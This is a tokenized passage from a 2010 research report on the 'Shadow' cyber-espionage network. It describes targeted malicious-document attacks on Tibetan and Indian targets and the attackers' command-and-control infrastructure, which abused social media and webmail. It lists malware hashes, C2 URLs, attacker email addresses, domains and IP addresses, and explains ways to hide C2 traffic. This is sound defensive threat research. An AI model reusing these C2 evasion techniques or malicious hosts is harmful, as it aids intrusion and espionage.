",", "or", "at", "least", "help", "distinguish", "more", "\u201c", "connected", "\u201d", "attackers", "from", "\u201c", "less", "connected", "\u201d", "ones", "."], ["The", "varying", "levels", "of", "sophistication", "in", "tools", ",", "research", "and", "delivery", "set", "these", "actors", "apart", ",", "can", "make", "them", "more", "or", "less", "effective", ",", "and", "establish", "their", "level", "of", "connection", "within", "the", "underground", "community", "."], ["A", "very", "sophisticated", "attacker", ",", "for", "example", ",", "will", "likely", "be", "part", "of", "a", "network", "in", "the", "criminal", "underground", "that", "has", "access", "to", "the", "latest", "exploits", "and", "kits", "that", "generate", "files", "with", "exploits", "to", "install", "their", "malicious", "payload", "."], ["These", "kits", "and", "files", "are", "not", "readily", "available", "to", "the", "average", "cyber", "criminal", "."], ["A", "slightly", "less", "sophisticated", "attacker", "might", "have", "access", "to", "the", "same", "kits", "and", "exploits", "once", "the", "vulnerability", "has", "been", "publicly", "disclosed", ",", "but", "prior", "to", "there", "being", "a", "security", "patch", "issued", "for", "them", "."], ["While", "from", "time", "to", "time", "various", "methods", "of", "generating", "malicious", "PDFs", "and", "other", "document", "types", "will", "appear", "on", "websites", "like", "the", "Metasploit", "(", "www.metasploit.com", ")", "and", "milw0rm", "(", "www.milw0rm.com", ")", ",", "the", "vast", "majority", "of", "these", "exploits", "and", "kits", "are", "not", "available", "publicly", "."], ["The", "ability", "to", "successfully", "compromise", "a", "target", "relies", "on", "more", "than", "just", "code", "designed", "to", "exploit", "vulnerabilities", "in", "software", "\u2013", "it", "requires", "\u201c", "exploiting", "the", "human", "element", "\u201d", "as", "well", "(", "Nolan", "and", "Levesque", "2005", ")", "."], ["The", "digital", "traces", "individuals", "leave", "behind", "on", "the", "Internet", "can", "be", "used", "to", "manipulate", "trust", ",", "and", "are", "used", "by", "attackers", "to", "encourage", "targets", "to", "execute", "malicious", "code", "on", "their", "systems", "."], ["The", "first", "phase", "of", "a", "targeted", "attack", "usually", "involves", "an", "\u201c", "information", "acquisition", "phase", ",", "\u201d", "in", "which", "information", "on", "potential", "targets", "is", "compiled", "from", "a", "variety", "of", "public", "sources", ",", "including", "social", "and", "professional", "networking", "sites", ",", "conference", "proceedings", ",", "academic", "papers", "and", "project", "information", ",", "in", "order", "to", "generate", "a", "profile", "of", "the", "target", "(", "Smith", "and", "Toppel", "2009", ")", "."], ["Targeted", "malware", "attacks", "often", "leverage", "publicly", "available", "information", "to", "make", "their", "social", "engineering", "attempts", "more", "plausible", "."], ["Individuals", "are", "much", "more", "likely", "to", "become", "victims", "of", "targeted", "attacks", "if", "malware", "is", "sent", "to", "them", "from", "what", "appears", "to", "be", "an", "acquaintance", "or", "a", "colleague", "(", "Jagatic", "et", "al", ".", "2007", ")", "."], ["Targeted", "malware", "attacks", "are", ",", "in", "many", "cases", ",", "personalised", "at", "the", "individual", "or", "organizational", "level", "."], ["Moreover", ",", "an", "attacker", "may", "leverage", "the", "credentials", "of", "a", "previously", "compromised", "acquaintance", "to", "add", "increased", "levels", "of", "legitimacy", "to", "the", "attack", "."], ["As", "a", "result", ",", "the", "attackers", "are", "able", "to", "convince", "the", "target", "into", "executing", "malicious", "code", "on", "their", "own", "computer", ",", "thus", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "17", "resulting", "in", "the", "attackers", "gaining", "full", "control", "."], ["Typically", ",", "a", "user", "receives", "an", "email", ",", "possibly", "appearing", "to", "be", "from", "someone", "that", "they", "know", "who", "is", "a", "real", "person", "within", "his", "or", "her", "organization", ",", "with", "some", "text", "\u2014", "sometimes", "specific", ",", "sometimes", "generic", "\u2014", "that", "urges", "the", "user", "to", "open", "an", "attachment", "(", "or", "visit", "a", "web", "site", ")", ",", "usually", "a", "PDF", "or", "Microsoft", "Office", "document", "(", "e.g.", ",", "DOC", ",", "PPT", ",", "XLS", "and", "others", ")", "."], ["These", "attacks", "may", "be", "spoofed", "or", "even", "come", "from", "the", "real", "email", "account", "of", "someone", "else", "who", "has", "fallen", "victim", "to", "a", "similar", "attack", ",", "in", "what", "can", "be", "called", "a", "man", "-", "in", "-", "the", "-", "mailbox", "attack", "(", "Markoff", "and", "Barboza", "2010", ")", "."], ["If", "the", "user", "opens", "the", "attachment", "with", "a", "vulnerable", "version", "of", "Adobe", "Reader", "or", "Microsoft", "Office", "(", "other", "types", "of", "software", "are", "also", "being", "exploited", ")", "and", "no", "other", "mitigations", "are", "in", "place", ",", "their", "computer", "will", "likely", "be", "compromised", "(", "F", "-", "Secure", "2010", ")", "."], ["A", "clean", "version", "of", "the", "document", "is", "typically", "embedded", "in", "the", "malicious", "file", "and", "is", "opened", "upon", "successful", "exploitation", ",", "so", "as", "not", "to", "arouse", "suspicion", "of", "the", "recipient", "."], ["What", "is", "done", "next", "is", "then", "only", "limited", "to", "the", "imagination", "and", "abilities", "of", "the", "attacker", "."], ["In", "a", "recent", "report", ",", "Symantec", "\u2019s", "Message", "Labs", "revealed", "that", "the", "bulk", "of", "the", "targeted", "email", "attacks", "that", "they", "have", "studied", "originates", "from", "the", "PRC", "(", "28.2", "%", ")", ",", "Romania", "(", "21.1", "%", ")", "and", "the", "United", "States", "(", "13.8", "%", ")", "."], ["Leveraging", "business", "-", "related", "information", "or", "popular", "topics", "in", "the", "news", ",", "the", "attackers", "largely", "target", "those", "with", "a", "\u201c", "a", "high", "or", "medium", "ranking", "seniority", "\u201d", "within", "an", "organization", "."], ["The", "most", "freguently", "targeted", "individuals", "include", "defence", "policy", "experts", ",", "diplomatic", "missions", ",", "and", "human", "rights", "activists", "and", "researchers", "(", "Symantec", "2010", ")", "."], ["The", "antivirus", "detection", "for", "these", "documents", "is", "usually", "relatively", "low", ",", "and", "if", "the", "exploit", "is", "a", "0day", "\u2014", "an", "exploit", "for", "which", "there", "is", "no", "fix", "from", "the", "vendor", "available", "\u2014", "the", "chances", "of", "compromise", "are", "very", "good", "."], ["In", "the", "attacks", "documented", "in", "this", "report", ",", "the", "user", "\u2019s", "computer", "checks", "in", "with", "a", "command", "and", "control", "server", "after", "it", "is", "compromised", "."], ["Our", "attackers", "used", "free", "services", "from", "various", "providers", "to", "instruct", "infected", "systems", "to", "beacon", "to", "new", "command", "and", "control", "servers", "that", "were", "setup", "and", "fully", "managed", "by", "them", "."], ["This", "check", "-", "in", "or", "beaconing", "activity", "is", "conducted", "using", "an", "HTTP", "connection", "and", "blends", "in", "with", "normal", "web", "traffic", "."], ["When", "beaconing", "the", "compromised", "computer", "sends", "some", "information", ",", "usually", "its", "IP", "address", "and", "operating", "system", "information", ",", "and", "receives", "a", "command", "which", "it", "then", "executes", "."], ["At", "this", "point", "the", "attacker", "has", "full", "control", "of", "the", "user", "\u2019s", "system", "."], ["The", "attacker", "can", "steal", "documents", ",", "email", "and", "send", "other", "data", ",", "or", "force", "the", "compromised", "computer", "to", "download", "additional", "malware", "and", "possibly", "use", "the", "infected", "computer", "as", "a", "mechanism", "to", "exploit", "the", "victim", "\u2019s", "contacts", "or", "other", "computers", "on", "the", "target", "network", "."], ["In", "our", "examination", "of", "the", "network", ",", "it", "appeared", "systems", "were", "most", "frequently", "instructed", "to", "upload", "documents", "and", "download", "additional", "executables", "."], ["3.2.2", "Malicious", "Documents", "and", "Command", "and", "Controls"], ["While", "we", "only", "have", "limited", "insight", "into", "the", "motivations", "and", "methods", "of", "the", "attackers", ",", "we", "believe", "they", "infected", "victims", "primarily", "via", "email", "using", "social", "engineering", "techniques", "to", "convince", "their", "victims", "to", "open", "malicious", "file", "attachments", ",", "as", "described", "above", "."], ["The", "people", "behind", "the", "Shadow", "attacks", "used", "a", "variety", "of", "exploits", "and", "filetypes", "to", "compromise", "their", "victims", "."], ["We", "observed", "the", "group", "using", "PDF", ",", "PPT", ",", "and", "DOC", "file", "formats", "to", "exploit", "Adobe", "Acrobat", "and", "Acrobat", "Reader", ",", "Microsoft", "Word", "2003", "and", "Microsoft", "PowerPoint", "2003", "."], ["The", "themes", "of", "their", "attacks", "appear", "to", "involve", "topics", "that", "would", "likely", "be", "of", "interest", "to", "the", "Indian", "and", "Tibetan", "communities", "."], ["This", "can", "be", "observed", "through", "the", "file", "names", "of", "the", "malicious", "exploit", "files", ",", "as", "well", "as", "looking", "at", "the", "clean", "or", "non", "-", "malicious", "files", "they", "then", "open", "after", "exploitation", "."], ["We", "were", "able", "to", "obtain", "dozens", "of", "exploit", "files", "that", "were", "used", "by", "the", "attackers", "when", "targeting", "their", "victims", "."], ["The", "Microsoft", "Word", "2003", "and", "PowerPoint", "2003", "files", "were", "mostly", "older", "exploits", ",", "which", "have", "been", "circulating", "in", "the", "underground", "hacker", "community", "for", "some", "time", "."], ["The", "PDF", "files", ",", "on", "the", "other", "hand", ",", "took", "advantage", "of", "much", "more", "recent", "exploits", "at", "the", "time", "of", "their", "use", "."], ["We", "observed", "them", "using", "PDF", "files", "that", "exploited", "CVEs", "2009", "-", "0927", ",", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "18", "2009", "-", "2990", ",", "and", "2009", "-", "4324", "within", "a", "few", "weeks", "or", "months", "of", "the", "vulnerability", "being", "first", "patched", "."], ["Our", "research", "did", "not", "reveal", "them", "using", "exploits", "that", "were", "0day", "at", "the", "time", ",", "but", "we", "only", "have", "limited", "insight", "into", "their", "attacks", "and", "may", "have", "easily", "not", "been", "privy", "to", "information", "from", "such", "attacks", "at", "the", "time", "."], ["It", "is", "also", "worth", "noting", "that", "the", "exploits", "they", "used", "in", "their", "attacks", "are", "not", "generated", "from", "freely", "available", "tools", "or", "publicly", "posted", "exploit", "code", "."], ["Our", "attacks", "appear", "to", "have", "some", "level", "of", "access", "to", "PPT", ",", "DOC", ",", "and", "PDF", "exploit", "generation", "kits", "that", "allow", "them", "to", "create", "exploit", "files", "on", "the", "fly", "that", "install", "their", "malware", "."], ["Table", "2", "below", "is", "a", "sampling", "of", "each", "of", "the", "malicious", "document", "file", "formats", "that", "we", "observed", "and", "analyzed", "that", "were", "used", "by", "these", "attackers", "in", "targeted", "attacks", "."], ["Table", "2", ":"], ["Malicious", "Document", "File", "Formats", "Date", "2009", "-", "08", "-", "11", "Filename", "Sino-India_Border.ppt", "File", "Type", "PPT", "Target", "Microsoft", "PowerPoint", "2003", "MD5", "c35b3ea71370cb5bfe2b523c17705ecb", "C2", "(", "initial", ")", "Stage", "1", ":", "http://groups.google.com/group/estolide/feed/rss_v2_0_msgs.xml", "C2", "(", "cmd", ")", "Stage", "2", ":", "http://www.idefesvn.com/test/ieupdate.php", "Date", "2010", "-", "01", "-", "08"], ["Filename", "Schedule2010_of_HHDL.pdf", "File", "Type", "PDF"], ["Targeted", "Adobe", "Acrobat", "/", "Reader", "(", "CVE-2009", "-", "0927", ")"], ["MD5", "dfc76b1f94ec13cbd8ae3b3371f23841", "C2", "(", "initial", ")", "Stage", "1", ":", "http://groups.google.com/group/tagyalten/feed/rss_v2_0_msgs.xml", "C2", "(", "cmd", ")", "Stage", "2", ":", "http://www.c2etejs.com/kk/all.php"], ["Date", "2009", "-", "08", "-", "20", "Filename", "China_should_break_up_India.doc", "File", "Type", "DOC", "Target", "Microsoft", "Word", "2003", "MD5", "17a26441eb2be5efb8344e53cbd7d499", "C2", "(", "initial", ")", "Stage", "1", ":", "http://hiok125.blog.com", "C2", "(", "cmd", ")", "Stage", "2", ":", "http://www.erneex.com/boboshell/all.php", "3.2.3", "Malicious", "Binaries", "found", "on", "Command", "and", "Controls"], ["During", "our", "investigation", "we", "were", "able", "to", "acquire", "twenty", "-", "seven", "malicious", "binaries", "used", "by", "the", "attackers", "."], ["While", "many", "of", "them", "contain", "functionality", "similar", "to", "the", "malicious", "payload", "of", "the", "document", "types", "enumerated", "above", "as", "well", "as", "common", "command", "and", "control", "server", "locations", "there", "were", "several", "binaries", "whose", "functionality", "differed", "significantly", "."], ["We", "discovered", "that", "two", "of", "the", "binaries", "were", "using", "Yahoo", "!"], ["Mail", "accounts", "as", "an", "element", "of", "command", "and", "control", "."], ["More", "specifically", ",", "in", "addition", "to", "checking", "in", "with", "the", "Yahoo", "!"], ["Mail", "accounts", ",", "new", "malicious", "binaries", "were", "pushed", "to", "the", "compromised", "computers", "from", "the", "email", "account", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "19", "Table", "3", ":"], ["Malware", "Connecting", "to", "Yahoo", "!"], ["Mail", "Accounts"], ["Filename", "setup.exe", "MD5", "7e2e37c78bc594342e498d6299c19158", "C2", "sonamtenphel@yahoo.com", "C2", "www.indexindian.com", "Download", "sites.google.com/site/wwwfox99/Home/", "Filename", "20090930165916978"], ["MD5", "abef3f0396688bfca790f8bbedac3e0d", "C2", "zhengwai@yahoo.com"], ["Although", "the", "second", "binary", "failed", "to", "connect", "to", "a", "web", "-", "based", "command", "and", "control", "server", ",", "a", "memory", "dump", "revealed", "three", "additional", "email", "adresses", "(", "wwwfoxperter@yahoo.com", ",", "swwwfox@yahoo.in", "and", "ctliliwoy5@", "yahoo.com", ")", "as", "well", "as", "the", "well", "known", "domain", "name", "www.indexindian.com", "and", "the", "URL", "of", "another", "malicious", "binary", "hosted", "on", "sites.google.com/site/wwwfox99/."], ["This", "malware", "sample", "connected", "to", "a", "command", "and", "control", "server", "and", "downloaded", "additional", "components", "(", "docBack.gif", ",", "nscthttp.gif", ",", "top.gif", ",", "tor.gif", ")", "that", "allowed", "it", "to", "connect", "to", "the", "Tor", "anonymity", "network", "."], ["The", "reason", "behind", "the", "attackers", "integration", "of", "Tor", "into", "their", "malware", "remains", "unclear", "."], ["Table", "4", ":", "Malware", "with", "Tor", "Filename", "20091221165850243", "MD5", "2ca46bcdfda08adc94ab41d3ed049ab6", "C2", "cxingpeng.byethost9.com"], ["Tor", "(", "www.torproject.org", ")", "is", "an", "anonymity", "system", "that", "defends", "users", "from", "traffic", "analysis", "attacks", "in", "which", "attackers", "attempt", "to", "monitor", "users", "\u2019", "online", "behaviour", "."], ["Tor", "is", "used", "by", "journalists", ",", "human", "rights", "advocates", ",", "and", "those", "in", "locations", "that", "are", "subject", "to", "Internet", "censorship", "."], ["It", "is", "also", "used", "by", "law", "enforcement", "and", "many", "others", "who", "require", "anonymity", "."], ["In", "2007", ",", "a", "computer", "security", "researcher", ",", "Dan", "Egerstad", "collected", "data", "and", "email", "login", "credentials", "for", "a", "variety", "of", "embassies", "around", "the", "world", "by", "monitoring", "the", "traffic", "exiting", "from", "Tor", "exit", "nodes", ",", "an", "anonymous", "communications", "network", "."], ["He", "was", "able", "to", "obtain", "user", "names", "and", "passwords", "for", "a", "variety", "of", "email", "accounts", ",", "and", "recovered", "data", "associated", "with", "the", "Dalai", "Lama", "\u2019s", "office", "as", "well", "as", "India", "\u2019s", "Defence", "Research", "and", "Development", "Organization", "(", "Zetter", "2007a", ")", "."], ["Tor", "does", "not", "automatically", "encrypt", "everything", "that", "a", "user", "does", "online", "."], ["Unless", "the", "end", "-", "point", "of", "a", "connection", "is", "encrypted", ",", "the", "data", "passing", "through", "an", "exit", "node", "in", "the", "Tor", "network", "will", "be", "in", "plain", "text", "."], ["Since", "anyone", "can", "operate", "a", "Tor", "exit", "node", ",", "it", "is", "possible", "for", "a", "malicious", "user", "to", "intercept", "the", "plain", "text", "communications", "passing", "through", "it", "."], ["However", ",", "Egerstad", "believes", "that", "the", "entities", "whose", "credentials", "and", "data", "he", "was", "able", "to", "collect", "were", "not", "using", "Tor", "themselves", "."], ["Rather", ",", "he", "concluded", "that", "attackers", "may", "have", "been", "using", "the", "Tor", "network", "as", "a", "mechanism", "to", "exfiltrate", "data", ":"], ["The", "embassy", "employees", "were", "likely", "not", "using", "Tor", "nor", "even", "knew", "what", "Tor", "was", "."], ["Instead", ",", "we", "suspected", "that", "the", "traffic", "he", "sniffed", "belonged", "to", "someone", "who", "had", "hacked", "the", "accounts", "and", "was", "eavesdropping", "on", "them", "via", "the", "Tor", "network", "."], ["As", "the", "hacked", "data", "passed", "through", "Egerstad", "\u2019s", "Tor", "exit", "nodes", ",", "he", "was", "able", "to", "read", "it", "as", "well", "(", "Zetter", "2007b", ")", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "20", "Table", "5", ":"], ["Enfal"], ["Filename", "20090924152410520", "MD5", "9f0b3d0672425081cb7a988691535cbf", "C2", "www.indexnews.org"], ["On", "one", "of", "the", "command", "and", "control", "severs", ",", "we", "also", "discovered", "that", "the", "attackers", "were", "using", "Enfal", ",", "a", "well", "known", "Trojan", "."], ["The", "malware", "connected", "to", "www.indexnews.org", "and", "requested", "the", "following", "file", "paths", ":"], ["/cgi", "-", "bin/"], ["Owpq4.cgi", "and", "/httpdocs", "/", "mm/[HOSTNAME]_20090610", "/"], ["Cmwhite", "."], ["We", "explore", "the", "broader", "connections", "and", "significance", "of", "use", "of", "Enfal", "in", "section", "3.3.1", "below", "."], ["3.3", "Command", "and", "Control", "Infrastructure", "Figure", "3", ":", "The", "Shadow", "Network", "\u2019s", "Command", "and", "Control", "Infrastructure"], ["This", "Palantir", "screen", "capture", "demonstrates", "the", "integration", "of", "social", "networking", "and", "blogging", "platforms", "(", "green", ")", ",", "domain", "names", "(", "blue", ")", "and", "web", "servers", "(", "red", ")", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "21"], ["The", "attackers", "\u2019", "command", "and", "control", "infrastructure", "consists", "of", "three", "interrelated", "components", "."], ["The", "first", "component", "consists", "of", "intermediaries", "that", "simply", "contain", "links", ",", "which", "can", "be", "updated", ",", "to", "command", "and", "control", "servers", "."], ["During", "our", "investigation", "we", "found", "that", "such", "intermediaries", "included", "Twitter", ",", "Google", "Groups", ",", "Blogspot", ",", "Baidu", "Blogs", ",", "and", "blog.com", "."], ["The", "attackers", "also", "used", "Yahoo", "!"], ["Mail", "accounts", "as", "a", "command", "and", "control", "component", "in", "order", "to", "send", "new", "malicious", "binaries", "to", "compromised", "computers", "."], ["On", "at", "least", "one", "occasion", "the", "attackers", "also", "used", "Google", "Pages", "to", "host", "malware", "."], ["To", "be", "clear", ",", "the", "attackers", "were", "misusing", "these", "systems", ",", "not", "exploiting", "any", "vulnerability", "in", "these", "platforms", "."], ["In", "total", ",", "we", "found", "three", "Twitter", "accounts", ",", "five", "Yahoo", "!"], ["Mail", "accounts", ",", "twelve", "Google", "Groups", ",", "eight", "Blogspot", "blogs", ",", "nine", "Baidu", "blogs", ",", "one", "Google", "Sites", "and", "sixteen", "blogs", "on", "blog.com", "that", "were", "being", "used", "as", "part", "of", "the", "attacker", "\u2019s", "infrastructure", "."], ["The", "attackers", "simply", "created", "accounts", "on", "these", "services", "and", "used", "them", "as", "a", "mechanism", "to", "update", "compromised", "computers", "with", "new", "command", "and", "control", "server", "information", "."], ["Even", "a", "vigilant", "network", "administrator", "looking", "for", "rogue", "connections", "exiting", "the", "network", "may", "overlook", "such", "connections", "as", "they", "are", "routine", "and", "generally", "considered", "to", "be", "safe", "web", "sites", "."], ["The", "use", "of", "social", "networking", "platforms", ",", "blogs", "and", "other", "services", "offered", "by", "trusted", "companies", "allows", "the", "attackers", "to", "maintain", "control", "of", "compromised", "computers", "even", "if", "direct", "connections", "to", "the", "command", "and", "control", "servers", "are", "blocked", "at", "the", "firewall", "level", "."], ["The", "compromised", "computers", "can", "simply", "be", "updated", "through", "these", "unblocked", "intermediaries", "to", "point", "to", "a", "new", ",", "as", "yet", "unknown", ",", "control", "server", "."], ["Such", "techniques", "are", "not", "new", "per", "se", ",", "and", "nothing", "in", "and", "of", "itself", "was", "invented", "by", "the", "Shadow", "attackers", "that", "had", "not", "been", "done", "before", "(", "See", "Box", "3", ")", "."], ["Rather", ",", "the", "attackers", "are", "learning", "from", "the", "experiences", "of", "others", "and", "adapting", "the", "techniques", "to", "meet", "their", "needs", "."], ["By", "using", "these", "kind", "of", "intermediaries", "and", "platforms", ",", "the", "attackers", "are", "able", "to", "conceal", "their", "activities", "and", "maintain", "a", "resilient", "command", "and", "control", "infrastructure", "."], ["In", "the", "Shadow", "case", ",", "the", "attackers", "did", "not", "rely", "on", "only", "one", "social", "networking", ",", "cloud", "computing", "or", "Web", "2.0", "service", ",", "but", "rather", "used", "a", "variety", "of", "such", "services", "in", "combination", "with", "one", "another", "."], ["Box", "3", ":", "Social", "Network", "Sites", "as", "Control", "Channels", "for", "Malware", "Networks"], ["The", "use", "of", "social", "networking", "sites", "as", "elements", "of", "command", "and", "control", "for", "malware", "networks", "is", "not", "novel", "."], ["The", "attackers", "leverage", "the", "normal", "operation", "of", "these", "systems", "in", "order", "to", "maintain", "control", "over", "compromised", "system", "."], ["In", "2009", ",", "researchers", "found", "that", "Twitter", ",", "Jaiku", ",", "Tumblr", ",", "Google", "Groups", ",", "Google", "AppEngine", "and", "Facebook", "had", "all", "been", "used", "as", "the", "command", "and", "control", "structure", "for", "malware", "."], ["In", "August", "2009", ",", "Arbor", "Networks", "\u2019", "Jose", "Nazario", "found", "that", "Twitter", "was", "being", "used", "as", "a", "command", "and", "control", "component", "for", "a", "malware", "network", "."], ["In", "this", "case", ",", "the", "malware", "was", "an", "information", "stealer", "focused", "on", "extracting", "banking", "credentials", "from", "compromised", "computers", "located", "mostly", "in", "Brazil", "."], ["Twitter", "was", "not", "the", "only", "channel", "being", "used", "by", "the", "attackers", "."], ["They", "also", "used", "accounts", "on", "Jaiku", "and", "Tumblr", "(", "Nazario", "2009a", ")", "."], ["Furthermore", ",", "Arbor", "Networks", "found", "another", "instance", "of", "malware", "that", "used", "the", "Google", "AppEngine", "to", "deliver", "malicious", "URLs", "to", "compromised", "computers", "(", "Nazario", "2009b", ")", "."], ["The", "Unmask", "Parasites", "blog", "found", "that", "obfuscated", "scripts", "embedded", "in", "compromised", "web", "sites", "used", "the", "Twitter", "API", "to", "obscure", "their", "activities", "."], ["While", "the", "method", "was", "clever", ",", "the", "code", "was", "unreliable", "and", "appeared", "to", "have", "been", "abandoned", "by", "the", "attackers", "(", "Unmask", "Parasites", "2009", ")", "."], ["Symantec", "found", "that", "Google", "Groups", "were", "being", "used", "as", "command", "and", "control", "for", "another", "instance", "of", "malware", "."], ["In", "this", "case", ",", "a", "private", "Google", "group", "was", "used", "by", "the", "attackers", "to", "send", "commands", "to", "compromised", "computers", "which", "then", "uploaded", "their", "responses", "to", "the", "same", "Group", "(", "Symantec", "2009a", ")"], ["Symantec", "also", "found", "an", "instance", "of", "malware", "that", "used", "Facebook", "status", "messages", "as", "a", "mechanism", "of", "command", "and", "control", "."], ["(", "Symantec", "2009b", ")", "."], ["The", "use", "of", "these", "social", "networking", "and", "Web", "2.0", "tools", "allows", "the", "attackers", "to", "leverage", "the", "normal", "operation", "of", "these", "tools", "to", "obscure", "the", "command", "and", "control", "functions", "of", "malware", "."], ["One", "platform", "leveraged", "by", "the", "attackers", "in", "particularly", "interesting", "ways", "was", "the", "webmail", "service", "provided", "by", "Yahoo", "!", "."], ["We", "discovered", "five", "Yahoo", "!"], ["Mail", "accounts", "being", "used", "by", "the", "attackers", "as", "a", "component", "of", "command", "and", "control", "."], ["Once", "a", "computer", "was", "compromised", ",", "the", "malware", "connected", "to", "the", "Yahoo", "!"], ["Mail", "accounts", "using", "Yahoo", "\u2019s", "API", "and", "created", "a", "unique", "folder", "in", "the", "Inbox", "of", "the", "mail", "account", ",", "into", "which", "an", "email", "was", "inserted", "containing"], ["the", "computer", "\u2019s", "name", ",", "operating", "system", "and", "IP", "address", "."], ["The", "attacker", "would", "then", "send", "an", "email", "to", "the", "account", "containing", "a", "command", "or", "a", "command", "along", "with", "additional", "malware", "as", "an", "attachment", "."], ["The", "next", "time", "that", "a", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "22", "compromised", "computer", "checks", "in", "with", "the", "email", "account", ",", "it", "then", "downloads", "and", "executes", "the", "malicious", "attachment", "."], ["Upon", "execution", ",", "the", "compromised", "computer", "placed", "an", "acknowledgement", "mail", "in", "the", "Yahoo", "!"], ["Mail", "Inbox", "."], ["The", "email", "addresses", "used", "by", "the", "attackers", "were", ":", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "zhengwai@yahoo.com"], ["wwwfoxperter@yahoo.com"], ["swwwfox@yahoo.in"], ["ctliliwoy5@yahoo.com"], ["sonamtenphel@yahoo.com"], ["The", "attackers", "used", "these", "Yahoo", "!"], ["Mail", "accounts", "as", "command", "and", "control", "in", "conjunction", "with", "traditional", "mechanisms", ",", "such", "as", "HTTP", "connections", "to", "web", "servers", "."], ["Therefore", ",", "even", "if", "the", "traditional", "web", "-", "based", "command", "and", "control", "channels", "were", "shut", "down", "the", "attacker", "could", "retain", "control", "using", "the", "Yahoo", "!"], ["Mail", "mechanism", "."], ["Moreover", ",", "the", "web", "-", "based", "component", "of", "command", "and", "control", "was", "also", "resilient", "."], ["We", "found", "that", "command", "and", "control", "servers", "were", "being", "operated", "on", "free", "hosting", "sites", "and", "on", "free", "domain", "providers", "such", "co.tv", "and", "net.ru", "."], ["We", "found", "command", "and", "control", "servers", "on", "the", "following", "free", "web", "hosting", "providers", ":", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "byethost9.com", "6te.net"], ["justfree.com", "sqweebs.com", "yourfreehosting.net", "kilu.de", "5gighost.com"], ["hostaim.com", "5webs.net"], ["55fast.com"], ["surge8.com", "In", "addition", "we", "found", "servers", "on", "free", "domains", "provided", "by", "co.tv", "and", "net.ru", "."], ["All", "of", "the", "IP", "addresses", "to", "which", "the", "sub", "-", "domains", "of", "these", "control", "servers", "resolve", "are", "in", "the", "United", "States", ",", "with", "the", "exception", "of", "one", "that", "is", "hosted", "in", "Germany", "."], ["The", "command", "and", "control", "servers", "on", "free", "hosting", "are", ":"], ["\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "changemore.hostaim.com", "choesang.5gighost.com", "freegate.kilu.de", "freesp.6te.net", "hardso.yourfreehosting.net", "scjoinsign.sqweebs.com"], ["tshkung01.justfree.com"], ["www.99fm.co.tv", "www.j5yr.co.tv", "zcagua.6te.net", "cxingpeng.byethost9.com"], ["lobsang.net.ru", "freesp.55fast.com", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "23", "\u0083\u0083", "iloveusy.justfree.com", "\u0083\u0083", "zenob.surge8.com"], ["\u0083\u0083", "bigmouse.5webs.net"], ["As", "some", "of", "the", "free", "hosting", "accounts", "became", "unavailable", ",", "the", "attacker", "\u2019s", "modified", "blog", "posts", "on", "the", "intermediaries", "to", "point", "to", "new", "command", "and", "control", "servers", ",", "most", "often", "to", "servers", "that", "appear", "to", "be", "the", "core", "of", "the", "network", "."], ["The", "core", "command", "and", "control", "servers", "reside", "on", "domain", "names", "that", "appear", "to", "be", "registered", "by", "the", "attackers", "themselves", "and", "on", "dedicated", "servers", "."], ["These", "control", "servers", "are", ":", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "c2etejs.com"], ["erneex.com", "idefesvn.com", "jdusnemsaz.com", "peose.com"], ["indexnews.org", "lookbytheway.net", "microsoftnews.net", "tibetcommunication.com", "intoplink.com", "indexindian.com", "All", "of", "these", "domain", "names", "are", "hosted", "in", "the", "PRC", "."], ["The", "first", "group", "of", "domain", "names", "(", "c2etejs.com", ",", "erneex.com", ",", "idefesvn.com", ",", "jdusnemsaz.com", ",", "peose.com", ")", "were", "all", "hosted", "on", "the", "same", "IP", "address", "\u00ad", "\u2014", "119.84.4.43", "\u2014", "but", "moved", "to", "another", "IP", "address", "\u00ad", "\u2014", "210.51.7.155", "\u2014", "which", "is", "associated", "with", "the", "more", "well", "known", "domain", "names", "indexindian.com", "and", "tibetcommunication.com", "."], ["The", "domains", "indexnews.org", "and", "lookbytheway.net", "are", "on", "61.188.87.27", ",", "microsoftnews.net", "is", "on", "61.188.87.79", ",", "and"], ["intoplink.com", "is", "on", "60.160.182.113", "."], ["The", "domains", "indexindian.com", ",", "indexnews.org", "and", "lookbytheway.net", "are", "well", "known", "malware", "domain", "names", "associated", "with", "more", "than", "one", "instance", "of", "malware", "."], ["3.3.1", "Malware", "Connections", ":", "Enfal"], ["One", "of", "our", "objectives", "in", "this", "report", "was", "to", "explore", "the", "broader", "ecosystem", "of", "malware", "."], ["While", "analysis", "of", "individual", "attacks", "may", "yield", "interesting", "data", ",", "a", "broader", "understanding", "of", "connections", "between", "malware", "networks", "allows", "us", "to", "better", "understand", "the", "methods", ",", "targets", "and", "capabilities", "of", "the", "attackers", "."], ["Based", "on", "the", "malware", "tools", "and", "command", "and", "control", "infrastructure", "collected", "as", "part", "of", "the", "Shadows", "in", "the", "Cloud", "investigation", "we", "were", "able", "to", "draw", "connections", "between", "the", "Shadow", "network", "and", 